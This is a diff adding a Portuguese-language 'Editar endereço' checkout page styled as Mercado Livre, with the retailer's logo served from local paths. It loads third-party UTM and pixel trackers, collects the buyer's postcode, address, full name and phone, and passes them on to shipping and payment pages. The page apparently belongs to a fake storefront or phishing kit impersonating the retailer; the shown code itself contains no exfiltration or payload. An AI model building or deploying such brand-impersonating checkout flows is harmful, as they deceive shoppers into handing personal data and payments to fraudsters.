@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <script src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js" data-token="9bb490c9-893a-4919-bf12-dbb15e467ca8"></script>
+    <script src="https://cdn.sentineltracking.io/sdk.js?pixel_id=sk_25fcb892d1b3fe7c57ee7bffcef94732707e491f48b380d0" async></script>
+    <script src="../js/utm.js"></script>
+    <script src="../api/xtracky-utm-helper.js"></script>
+    <script src="fix-utm-source.js"></script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Editar endereço</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <script src="../site_config.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #fff;
+            margin: 0;
+            padding-bottom: 40px;
+            font-family: 'Proxima Nova', Arial, sans-serif;
+        }
+
+        .header-compact {
+            background: #ffe600;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+        }
+
+        .header-compact .back-btn {
+            color: #333;
+            text-decoration: none;
+            font-size: 18px;
+            margin-right: 16px;
+        }
+
+        .header-compact .title {
+            font-size: 16px;
+            font-weight: 400;
+            color: #333;
+            flex: 1;
+            text-align: center;
+        }
+
+        .header-compact .logo {
+            height: 28px;
+        }
+
+        .form-section {
+            padding: 20px 16px;
+        }
+
+        .field-group {
+            margin-bottom: 24px;
+        }
+
+        .field-label {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 8px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .field-label a {
+            color: #3483fa;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .field-input {
+            width: 100%;
+            height: 48px;
+            border: none;
+            border-bottom: 1px solid #ddd;
+            font-size: 16px;
+            color: #333;
+            background: transparent;
+            outline: none;
+            padding: 0;
+        }
+
+        .field-input:focus {
+            border-bottom-color: #3483fa;
+        }
+
+        .location-info {
+            display: flex;
+            align-items: center;
+            padding: 12px 0;
+            margin-bottom: 16px;
+            font-size: 14px;
+            color: #333;
+            gap: 8px;
+        }
+
+        .location-info i {
+            color: #3483fa;
+            font-size: 16px;
+        }
+
+        .row-2col {
+            display: flex;
+            gap: 16px;
+        }
+
+        .row-2col .field-group {
+            flex: 1;
+        }
+
+        .row-2col .field-group.small {
+            flex: 0 0 100px;
+        }
+
+        .checkbox-inline {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            height: 48px;
+        }
+
+        .checkbox-inline input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: #3483fa;
+        }
+
+        .checkbox-inline label {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .textarea-wrap {
+            position: relative;
+        }
+
+        .field-textarea {
+            width: 100%;
+            min-height: 80px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 12px;
+            font-size: 16px;
+            color: #333;
+            resize: none;
+            font-family: inherit;
+        }
+
+        .field-textarea:focus {
+            outline: none;
+            border-color: #3483fa;
+        }
+
+        .char-count {
+            position: absolute;
+            bottom: 8px;
+            right: 12px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        .type-selector-container {
+            margin-top: 24px;
+        }
+
+        .type-selector-title {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 12px;
+            display: block;
+        }
+
+        .type-options-row {
+            display: flex;
+            gap: 12px;
+        }
+
+        .type-card {
+            flex: 1;
+            position: relative;
+            cursor: pointer;
+        }
+
+        .type-card input {
+            position: absolute;
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .card-inner {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            background: #fff;
+            transition: all 0.2s ease;
+            height: 90px;
+        }
+
+        .type-card input:checked+.card-inner {
+            border-color: #3483fa;
+            background-color: #f0f7ff;
+            box-shadow: 0 2px 4px rgba(52, 131, 250, 0.1);
+        }
+
+        .card-inner i {
+            font-size: 24px;
+            margin-bottom: 8px;
+            color: #bbb;
+            transition: color 0.2s;
+        }
+
+        .type-card input:checked+.card-inner i {
+            color: #3483fa;
+        }
+
+        .card-inner span {
+            font-size: 14px;
+            font-weight: 500;
+            color: #666;
+        }
+
+        .type-card input:checked+.card-inner span {
+            color: #3483fa;
+        }
+
+        .divider {
+            height: 8px;
+            background: #f5f5f5;
+            margin: 0 -16px;
+        }
+
+        .contact-section {
+            padding: 20px 16px;
+        }
+
+        .contact-section h3 {
+            font-size: 18px;
+            font-weight: 400;
+            color: #333;
+            margin: 0 0 8px;
+        }
+
+        .contact-section p {
+            font-size: 13px;
+            color: #666;
+            margin: 0 0 20px;
+            line-height: 1.4;
+        }
+
+        .btn-save {
+            width: calc(100% - 32px);
+            margin: 20px 16px;
+            height: 48px;
+            background: #3483fa;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+
+    <header class="header-compact">
+    <a href="#" class="back-btn" onclick="event.preventDefault(); voltarComFallback();">
+        <i class="fas fa-arrow-left"></i>
+    </a>
+    <span class="title">Editar endereço</span>
+    <img src="../images/mercado-livre-logo.png" class="logo" alt="Mercado Livre">
+</header>
+<script>
+function voltarComFallback(fallback = '../index.html') {
+    if (window.history.length > 1) {
+        window.history.back();
+    } else {
+        window.location.href = getUrlWithUtm(fallback);
+    }
+}
+</script>
+
+
+    <form id="form-address">
+        <div class="form-section">
+            <div class="field-group">
+                <div class="field-label">
+                    <span>CEP</span>
+                    <a href="https://buscacepinter.correios.com.br/app/endereco/index.php" target="_blank">Não sei meu CEP</a>
+                </div>
+                <input type="tel" id="cep" class="field-input" placeholder="00000000" maxlength="9" required>
+            </div>
+
+            <div id="location-info" class="location-info" style="display: none;">
+                <i class="fas fa-map-marker-alt"></i>
+                <span id="location-text"></span>
+            </div>
+
+            <div class="field-group">
+                <div class="field-label"><span>Rua / Avenida</span></div>
+                <input type="text" id="logradouro" class="field-input" required>
+            </div>
+
+            <div class="row-2col">
+                <div class="field-group small">
+                    <div class="field-label"><span>Número</span></div>
+                    <input type="text" id="numero" class="field-input" required>
+                </div>
+                <div class="field-group" style="display: flex; align-items: flex-end;">
+                    <div class="checkbox-inline">
+                        <input type="checkbox" id="sem-numero">
+                        <label for="sem-numero">Sem número</label>
+                    </div>
+                </div>
+            </div>
+
+            <div class="field-group">
+                <div class="field-label"><span>Complemento (opcional)</span></div>
+                <input type="text" id="complemento" class="field-input" placeholder="">
+            </div>
+
+            <div class="field-group">
+                <div class="field-label"><span>Informações adicionais deste endereço (opcional)</span></div>
+                <div class="textarea-wrap">
+                    <textarea id="info-adicional" class="field-textarea" maxlength="128" placeholder="Ex: Casa de esquina"></textarea>
+                    <span class="char-count"><span id="char-count">0</span> / 128</span>
+                </div>
+            </div>
+
+            <div class="type-selector-container">
+                <span class="type-selector-title">Este é o seu trabalho ou sua casa?</span>
+                <div class="type-options-row">
+                    <label class="type-card">
+                        <input type="radio" name="tipo" value="casa" checked>
+                        <div class="card-inner">
+                            <i class="fas fa-home"></i>
+                            <span>Casa</span>
+                        </div>
+                    </label>
+                    <label class="type-card">
+                        <input type="radio" name="tipo" value="trabalho">
+                        <div class="card-inner">
+                            <i class="fas fa-building"></i>
+                            <span>Trabalho</span>
+                        </div>
+                    </label>
+                </div>
+            </div>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="contact-section">
+            <h3>Dados de contato</h3>
+            <p>Se houver algum problema no envio, você receberá uma ligação neste número.</p>
+
+            <div class="field-group">
+                <div class="field-label"><span>Nome e sobrenome</span></div>
+                <input type="text" id="destinatario" class="field-input" required>
+            </div>
+
+            <div class="field-group">
+                <div class="field-label"><span>Telefone de contato</span></div>
+                <input type="tel" id="telefone" class="field-input" placeholder="00000000000" maxlength="15" required>
+            </div>
+        </div>
+
+        <button type="submit" class="btn-save">Salvar</button>
+    </form>
+
+    <script>
+        // Carregar dados salvos ao abrir a página
+        document.addEventListener('DOMContentLoaded', () => {
+            if (typeof window.Sentinel !== 'undefined' && window.Sentinel.track) {
+                window.Sentinel.track('page_view', {});
+            }
+
+            const savedData = localStorage.getItem('checkout_data');
+            if (savedData) {
+                try {
+                    const data = JSON.parse(savedData);
+                    
+                    // Preencher campos se existirem
+                    if (data.cep) document.getElementById('cep').value = data.cep;
+                    if (data.logradouro) document.getElementById('logradouro').value = data.logradouro;
+                    if (data.numero) document.getElementById('numero').value = data.numero;
+                    if (data.complemento) document.getElementById('complemento').value = data.complemento;
+                    if (data.infoAdicional) {
+                        document.getElementById('info-adicional').value = data.infoAdicional;
+                        document.getElementById('char-count').textContent = data.infoAdicional.length;
+                    }
+                    if (data.destinatario) document.getElementById('destinatario').value = data.destinatario;
+                    if (data.telefone) document.getElementById('telefone').value = data.telefone;
+                    
+                    // Selecionar tipo
+                    if (data.tipo) {
+                        const radioTipo = document.querySelector(`input[name="tipo"][value="${data.tipo}"]`);
+                        if (radioTipo) radioTipo.checked = true;
+                    }
+                    
+                    // Se tiver CEP, buscar localização
+                    if (data.cep) {
+                        const cep = data.cep.replace(/\D/g, '');
+                        if (cep.length === 8) {
+                            fetch(`https://viacep.com.br/ws/${cep}/json/`)
+                                .then(response => response.json())
+                                .then(viacepData => {
+                                    if (!viacepData.erro) {
+                                        document.getElementById('location-text').textContent = `${viacepData.localidade} - ${viacepData.uf}`;
+                                        document.getElementById('location-info').style.display = 'flex';
+                                    }
+                                })
+                                .catch(error => console.error('Erro ao buscar CEP:', error));
+                        }
+                    }
+                } catch (e) {
+                    console.error('Erro ao carregar dados salvos:', e);
+                }
+            }
+        });
+        
+        // Character counter
+        const textarea = document.getElementById('info-adicional');
+        const counter = document.getElementById('char-count');
+        if (textarea && counter) {
+            textarea.addEventListener('input', () => counter.textContent = textarea.value.length);
+        }
+
+        // Sem número
+        const semNumero = document.getElementById('sem-numero');
+        const numero = document.getElementById('numero');
+        if (semNumero && numero) {
+            semNumero.addEventListener('change', () => {
+                if (semNumero.checked) {
+                    numero.value = 'S/N';
+                    numero.disabled = true;
+                } else {
+                    numero.value = '';
+                    numero.disabled = false;
+                }
+            });
+        }
+
+        // Buscar CEP
+        const cepInput = document.getElementById('cep');
+        cepInput.addEventListener('blur', async () => {
+            const cep = cepInput.value.replace(/\D/g, '');
+            if (cep.length === 8) {
+                try {
+                    const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+                    const data = await response.json();
+                    
+                    if (!data.erro) {
+                        document.getElementById('logradouro').value = data.logradouro;
+                        document.getElementById('location-text').textContent = `${data.localidade} - ${data.uf}`;
+                        document.getElementById('location-info').style.display = 'flex';
+                    }
+                } catch (error) {
+                    console.error('Erro ao buscar CEP:', error);
+                }
+            }
+        });
+
+        // Submit form
+        document.getElementById('form-address').addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            // Dados do endereço
+            const formData = {
+                cep: document.getElementById('cep').value,
+                logradouro: document.getElementById('logradouro').value,
+                numero: document.getElementById('numero').value,
+                complemento: document.getElementById('complemento').value,
+                infoAdicional: document.getElementById('info-adicional').value,
+                tipo: document.querySelector('input[name="tipo"]:checked').value,
+                destinatario: document.getElementById('destinatario').value,
+                telefone: document.getElementById('telefone').value
+            };
+            
+            localStorage.setItem('checkout_data', JSON.stringify(formData));
+            
+            // Salvar dados de contato separadamente para preencher no pagamento
+            const nomeCompleto = document.getElementById('destinatario').value;
+            const telefone = document.getElementById('telefone').value;
+            
+            // Dividir nome em nome e sobrenome
+            const partesNome = nomeCompleto.trim().split(' ');
+            const nome = partesNome[0] || '';
+            const sobrenome = partesNome.slice(1).join(' ') || '';
+            
+            const contactData = {
+                nome: nome,
+                sobrenome: sobrenome,
+                nomeCompleto: nomeCompleto,
+                telefone: telefone
+            };
+            
+            localStorage.setItem('checkout_contact', JSON.stringify(contactData));
+
+            // Redirecionar para frete mantendo parâmetros da URL
+            const params = window.location.search;
+            window.location.href = getUrlWithUtm('frete.html');
+        });
+    </script>
+
+<script>
+function voltarComFallback(urlFallback){
+  try{
+    if(document.referrer && document.referrer.length>0){ history.back(); return; }
+    if(history.length>1){ history.back(); return; }
+  }catch(e){}
+  window.location.href = getUrlWithUtm(urlFallback);
+}
+</script>
+
+</body>
+
+</html>
